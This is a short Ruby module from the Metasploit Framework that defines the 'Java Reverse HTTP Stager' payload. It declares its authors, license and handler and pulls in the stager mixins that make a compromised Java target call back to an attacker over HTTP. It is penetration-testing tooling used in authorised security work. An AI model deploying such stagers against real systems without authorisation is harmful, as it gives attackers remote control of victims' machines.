##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_http'
require 'msf/core/payload/java/reverse_http'

module MetasploitModule

  CachedSize = 5386

  include Msf::Payload::Stager
  include Msf::Payload::Java
  include Msf::Payload::Java::ReverseHttp

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'Java Reverse HTTP Stager',
      'Description' => 'Tunnel communication over HTTP',
      'Author'      => ['mihi', 'egypt', 'hdm'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'java',
      'Arch'        => ARCH_JAVA,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'javaurl',
      'Stager'      => {'Payload' => ''}
    ))
  end
end
